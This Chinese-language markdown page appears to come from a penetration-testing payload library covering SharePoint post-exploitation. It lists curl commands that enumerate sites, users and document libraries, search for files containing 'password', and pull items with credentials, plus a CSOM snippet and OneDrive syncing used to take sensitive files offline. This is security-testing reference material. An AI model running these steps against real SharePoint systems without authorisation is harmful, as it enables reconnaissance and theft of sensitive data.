# 内网/后渗透 — SharePoint 攻击 payload 库

> 父文档:[00-index.md](00-index.md) · ⚠️ 渗透测试场景下大多受限,见 [../../compliance.md](../../compliance.md)
> 涵盖:信息收集 / SOAP API / OneDrive 同步利用

---

### SharePoint枚举  `sharepoint-enum`
枚举SharePoint站点和文件
子类：**枚举** · tags: `sharepoint` `enum` `recon`

**前置条件：** SharePoint可访问

**攻击链：**

**1. 站点枚举**  _[linux]_
_枚举站点_
```
curl -k https://sharepoint.com/_api/web/webs
获取所有子站点
```

**2. 用户枚举**  _[linux]_
_枚举用户_
```
curl -k https://sharepoint.com/_api/web/siteusers
获取站点用户列表
```

**3. 文件枚举**  _[linux]_
_枚举文档库_
```
curl -k https://sharepoint.com/_api/web/lists
获取文档库列表
```

**4. 搜索文件**  _[linux]_
_搜索敏感内容_
```
curl -k "https://sharepoint.com/_api/search/query?querytext='password'"
搜索敏感文件
```

---

### SharePoint文件访问  `sharepoint-file-access`
访问SharePoint文档库中的文件
子类：**文件访问** · tags: `sharepoint` `file` `access`

**前置条件：** SharePoint凭证或漏洞

**攻击链：**

**1. Web界面访问**
_Web界面访问_
```
https://sharepoint.com/sites/site_name/Shared Documents
通过浏览器访问文档库
下载敏感文件
```

**2. REST API访问**  _[linux]_
_REST API访问_
```
curl -k -u user:password "https://sharepoint.com/_api/web/lists/getbytitle('Documents')/items"
获取文档列表
下载文件内容
```

**3. CSOM访问**  _[windows]_
_CSOM访问_
```
使用SharePoint客户端对象模型:
ClientContext context = new ClientContext("https://sharepoint.com");
context.Credentials = new SharePointOnlineCredentials(user, password);
List list = context.Web.Lists.GetByTitle("Documents");
```

**4. OneDrive同步**
_OneDrive同步_
```
使用OneDrive客户端同步SharePoint文档库
本地访问所有文件
离线查看敏感数据
```

---


---

← 回 [00-index.md](00-index.md) · 上一篇:[`19-adcs.md`](19-adcs.md)
